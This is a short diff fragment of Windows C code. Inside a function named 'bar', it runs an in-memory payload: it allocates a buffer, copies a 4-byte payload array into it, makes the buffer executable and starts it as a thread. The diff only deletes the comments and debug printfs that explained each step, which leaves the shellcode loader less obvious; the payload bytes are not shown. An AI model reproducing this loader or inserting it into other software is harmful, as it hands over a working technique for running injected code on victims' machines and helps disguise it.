@@ -80,19 +80,12 @@ int bar(int x) {
 	};
 	unsigned int payload_len = 4;
 
-	// Allocate a memory buffer for payload
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
-	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
-	// Copy payload to new buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
 
-	// Make new buffer as executable
 	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
-	
-	// If all good, run the payload
 	if (rv != 0) {
 		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
 		WaitForSingleObject(th, -1);
